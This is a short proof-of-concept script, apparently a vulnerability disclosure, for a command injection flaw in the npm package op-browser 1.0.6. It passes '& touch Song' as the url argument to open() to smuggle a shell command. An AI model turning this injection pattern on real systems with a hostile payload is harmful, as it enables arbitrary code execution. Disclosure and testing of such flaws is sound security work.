/**
 * op-browser@1.0.6 is vulnerable to command injection.
 * the injection point is located in line 75 of index file "lib/index.js" in 
 * function open(browser, url, proxyURL, pacFileURL, dataDir, bypassList).
 * the url parameter can be controlled by users without any sanitization.
 */

var root = require("op-browser");
root.open('chrome','& touch Song','','');
